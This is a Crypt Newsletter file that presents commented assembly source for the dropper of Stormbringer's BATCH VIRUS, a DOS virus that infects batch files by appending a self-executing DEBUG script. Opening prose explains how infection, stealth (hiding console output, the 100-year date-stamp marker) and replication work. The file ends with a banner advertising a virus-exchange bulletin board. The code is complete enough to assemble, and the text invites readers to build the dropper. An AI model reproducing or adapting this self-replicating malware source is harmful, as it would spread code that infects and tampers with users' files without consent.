;STORMBRINGER's BATCH FILE VIRUS, a quick and dirty disassembly
;for Crypt Newsletter 24, by UKouch.
;
;Almost a year ago, Popular Science magazine published a "semi-technical"
;story on computer viruses.  As a demonstrator, the
;magazine included a "virus" constructed from batch commands.  As supplied,
;it did not work.
;
;However, although batch files are not normally thought of as targets or
;platforms for computer viruses, they can become so.  Ralf Burger's
;"Computer Viruses and Data Protection" (1991, Abacus) published 
;an example of how a batch file could be used to spread and 
;create viruses.  Crypt Newsletter 12 also
;published an example of how a batch file could be used as a dropper
;for new or any previously discovered IBM computer virus; a later
;issue developed the PC Carbuncle which constructed custom batch
;files used to execute itself - stored elsewhere as a hidden file -
;and targeted programs which were swapped to different names under
;indirect control by the virus.
;
;Stormbringer - the programmer who won Mark Ludwig's First International
;Virus Writing Contest - has written a computer virus which specifically
;parasitizes the "executable code" or batch command structure of any
;batch file.  While simple to understand conceptually, the programming
;which constitutes BATCH VIRUS is tricky and quite interesting.
;For example, infecting a batch file lets a virus simply add itself
;to the end of file without the absolute necessity of creating a jump
;to its own code at the beginning of the file and the concomitant
;rearrangement of host code which is involved. It also simplifies
;certain portions of the virus because it no longer has to figure out
;on the fly how its code displacements change from host file to host
;file of different size. It only knows that the batch file will eventually
;execute it, just like any string of typed commands, if present.
;
;The source code included here is not the BATCH VIRUS itself, but its
;dropper; the BATCH VIRUS only exists appended to infected batchfiles,
;one sample which is included as VIRUS.BAT.
;
;What the BATCH VIRUS does is search the current directory for
;uninfected batch files, recognizing itself through the old 4096 virus
;technique of queering the time/date stamp on the file to a nonsense
;value 100 years ahead of the file's original stamp. This is rather
;unique when practiced on batch files.  As with viruses which use this
;stunt to infect compiled code, the changed date does not appear to
;the user, but it is present in DOS's information on the file in
;question and BATCH VIRUS can and does recognize it.
;
;When it finds an uninfected batch file, BATCH VIRUS opens it, sets the 
;file pointer to the end of the target - usually two line feeds beyond
;the last typed command in the batch file - and writes itself to the
;file as an elaborate DEBUG script. The batch file and script turn off 
;output to the screen and input from the keyboard, reads data into the MS-DOS
;program DEBUG, executing the code in the process, thus infecting more
;batch files before returning control to the user. Obviously, the virus
;must assume that the MS/PC-DOS program DEBUG is present on the computer
;and accessible via the machine path - an environment which is a given
;if the user has DOS on the machine in an average configuration.
;Of course, if DEBUG has been taken off the machine, the virus
;won't work.
;
;To replicate, the virus reads its image into the batch file as data
;which is "echo'd" via batch command to a temporary file called batvir.94.  
;DOS creates this file for the virus, and much of the virus's data handling
;goes into reading text batch commands and DEBUG data of its image into the
;host - just as one might type it from the keyboard - complete with
;the necessary linefeeds, spaces and carriage returns.  
;In the critical set of virus commands, the batch process creates 
;the temporary file (batvir.94) which is used as a data pump for the
;program DEBUG which shells from the batch file, loads the BATCH VIRUS and 
;executes it as a program with the "g" or GO command. The virus takes control
;of the machine during this step and searches for more batchfiles
;to infect, exiting if none are found. The virus, or more accurately,
;its supporting batch commands in the original host, issues a "q" to
;QUIT debug, then deletes the temporary file created
;at start and returns control to the user.
;
;BATCH VIRUS works, although the rapid opening and closing of infected
;batch files by DOS makes it noticeable.  Normally, anti-virus programs
;do not consider batch files as viable targets for virus infection,
;so they're relatively blind to this type of attack. This is not,
;necessarily, a point of concern since actual batch viruses are rare,
;and the whole process is not particularly effective as a means of 
;propagating replicating code from machine to machine.
;Still, it can be done, and BATCH VIRUS demonstrates the point.
;
;VIRUS.BAT is a "host" batch file infected by BATCH VIRUS and it will
;infect other batch files if executed in a directory with them.
;
;The assembly language dropper can be constructed using the A86 assembler.
;It is not precisely identical to Stormbringer's original BATCH VIRUS,
;but it is close enough to study the code, make the dropper and convey 
;the general mechanics of the program.


VIRUS   SEGMENT
	ASSUME  CS:VIRUS, DS:VIRUS, ES:VIRUS, SS:NOTHING

	org     0100h

START:  mov     ah,4Eh                  ;search for batchfiles, *.bat
	mov     dx,0235h                ;Filemask for search, batchfiles
					;from ds:dx --> offset 0235h
NEXTFILELOOP:        

	int     21h                     ;Find first file, batchfile
	jb      EXIT                    ;exit to operating system if
					;no batchfiles in current directory
	mov     dx,009Eh                ;open found batchfile
	mov     ax,3D02h                ;with read/write permission            =
	int     21h                     
	jb      NEXTFILE                ;branch to find next batchfile loop
	xchg    ax,bx                   
	mov     ax,5700h                
	int     21h                     ;get/set file attributes found file             !
	
	push    cx                      ;store them
	push    dx                      ;
	cmp     dh,80h              ;virus recognition, add 100 years trick
	jnb     CLOSEFILE               ;if there, branch to close batchfile
	mov     ax,4202h                ;set file pointer to end of batchfile
	xor     cx,cx                   ;zero registers
	xor     dx,dx                   
	int     21h                     
	mov     si,0100h                ;set source to beginning 
	mov     di,02CAh                ;set destination for copy to heap 
	mov     cx,01CAh                ;set code to virus data: 451 bytes
	push    bx                      ;save position on stack
	call    VIRUSADD                ;begin nested subroutines for adding
					;virus data as elaborate DEBUG script
					;to batch file
	pop     bx                      
	call    WRITE_COMMANDS          ;write batch commands for calling
					;virus data into batchfile
	pop     dx                      
	add     dh,0C8h                 ;
	push    dx                      
CLOSEFILE: 
	pop     dx                      ;set attributes
	pop     cx                      ;
	mov     ax,5701h                ;
	int     21h                     
	mov     ah,3Eh                  ;close batchfile
	int     21h                     

NEXTFILE: 
	mov     ah,4Fh                  ;find next batchfile loop             O
	jmp     Short NEXTFILELOOP
;---------------------------------------
EXIT:   mov     ax,4C00h                
	int     21h                     ;exit to operating system             !
;---------------------------------------
VIRUSADD: 
	push    cx                      
	lodsb                           
	mov     bx,ax                   
	mov     cx,0004h                
	shr     al,cl                   
	push    ax                      
	call    LINE_FEED               
	
	stosb                           
	pop     ax                      
	sal     al,cl                   
	sub     bl,al                   
	xchg    al,bl                   
	call    LINE_FEED               

	stosb                           
	mov     ax,0020h                
	stosb                           
	pop     cx                      
	loop    VIRUSADD
	stosb                           
	stosb                           
	ret                             
;---------------------------------------
LINE_FEED: 
	cmp     al,0Ah                  ;<---encounter linefeed (0Ah)?            <
	jnb     CONTINUE               
	add     al,30h                  
	ret                             
;---------------------------------------
CONTINUE: 
	add     al,37h                  
	ret                             
;---------------------------------------

WRITE_COMMANDS: 
	mov     ah,40h           ;write to file, first viral batch commands
	mov     dx,0280h                ;beginning from source: "@echo off"
					;starts string of batch commands 
					;virus carries as data
	mov     cx,0040h                ;64 bytes written
	int     21h                     ;runs through ASCIIZ string limited
					;by "Stormbringer[P/S]" in data seg
	mov     dx,02CAh                
RESET:
	push    dx                      ;reset to virus ASCIIZ data in heap  
	call    ITERATE

	call    SCRIP_START

	pop     dx             
	push    dx             
	mov     cx,di          
	sub     cx,dx          

;ASM: Synonym
;A      cmp     cx,+3Ch        
       db      83h,0F9h,3Ch

	jb      EH
	mov     cx,003Ch                ;0019F  B93C00           <
EH: 
	mov     ah,40h         
	int     21h            
	push    ax             
	call    BATVIR_94

	pop     ax                   
	pop     dx                   
	add     dx,ax                
	cmp     dx,di                
	jnb     MASTER_BAT
	jmp     Short RESET
;---------------------------------------
MASTER_BAT:                             ;master subroutine for insertion
	call    WRITE_ECHO              ;of virus and viral batch commands
					;into target batchfile
	mov     ah,40h                  ;write to batch file
	mov     dx,023Bh         ;heap offset for DEBUG "go" command or "g"           ;
	mov     cx,0001h                ;1 byte only!
	int     21h                     
	
	call    BATVIR_94               ;insert "create BATVIR.94" command
					;in batchfile
	call    WRITE_ECHO

	mov     ah,40h                  ;
	mov     dx,023Ch                ;insert DEBUG "quit" command from 
	mov     cx,0001h                ;heap offset for "q", only one byte
	int     21h                     
	call    BATVIR_94

	mov     dx,0256h        ;load offset for "debug<batvir.94" batch 
	mov     cx,002Ah        ;command from data seg, write next 42 bytes
	mov     ah,40h          ;includes "ctty con" to restore control             @
				;to keyboard
	int     21h             
	ret                     
;---------------------------------------
BATVIR_94:
	mov     dx,0248h         ;load data offset for "  >>batvir.94" command
	mov     cx,000Eh         ;in batchfile, 15 bytes with linefeed/CR
	mov     ah,40h           ;write it
	int     21h             
	ret                     
;---------------------------------------
SCRIP_START: 
	mov     cx,000Bh                ;11 bytes to write
	jmp     Short ECHO_START        ;ECHO_START
;- - - - - - - - - - - - - - - - - - - -
WRITE_ECHO: 
	mov     cx,0005h                ;five bytes to write
ECHO_START: 
	mov     dx,023Dh                ;load offset 023Dh = "e" of "echo"           =
	mov     ah,40h                  ;write "echo" command plus 00             @
	int     21h                     
	ret                             
;---------------------------------------
ITERATE:           ;
	push    ax                      ;save everything
	push    bx                      
	push    cx                      
	push    dx                      
	push    si                      
	push    di                      
	sub     dx,02CAh            ;end of data seg    
	mov     ax,dx                   
	mov     cx,0003h                
	xor     dx,dx                   
	div     cx                      
	mov     dx,ax                   
	add     dx,0100h                
	mov     di,02C2h                
	mov     si,02C0h                
	xchg    dh,dl                   
	mov     ds:[02C0h],dx           
	mov     cx,0002h                
	call    VIRUSADD

	mov     di,0243h                ;<-load offset 0243h = "0" of "e0100"           C
	mov     si,02C2h                
	movsw                           
	lodsb                           
	movsw                           
	pop     di                      
	pop     si                      
	pop     dx                      
	pop     cx                      
	pop     bx                      
	pop     ax                      
	ret                             
;---------------------------------------
;DATA:                                  ;data for batch command language
	db      "*.bat"                 ;ds:dx ---> offset 0235h
	db      00h                     ;space -->  offset 023Ch
	db      "gqecho e0100  >>batvir.94" ;<-- indexed offsets 023Dh, 0243h
					;0023B  67716563
	db      0Dh                     ;linefeed
	db      0Ah                     ;carriage return
	db      "debug<batvir.94"    ;offset 0256h for batch command "de...
	db      0Dh                     ;linefeed
	db      0Ah                     ;carraige return
	db      "del batvir.94"         ;
	db      0Dh                     ;linefeed
	db      0Ah                     ;carriage return
	db      "ctty con"              ;etc.
	db      0Dh                     ;etc.
	dw      0D0Ah                   ;etc.
	db      0Ah                     
	db      "@echo off"             
	db      0Dh                     
	db      0Ah                     
	db      "ctty nul"              
	db      0Dh                     
	db      0Ah                     
	db      "rem [BATVIR] '94 (c) Stormbringer [P/S]" ;batch file "remark"
							  ;vanity plate
	db      0Dh                     
	dw      000Ah                   
	db      09h dup(00h)            

VIRUS   ENDS
	END     START


;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴�> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <컴컴컴컴컴컴컴�
;  컴컴컴컴컴�> ArReStEd DeVeLoPmEnT +31.77.547477 H/p/A/v/AV/? <컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
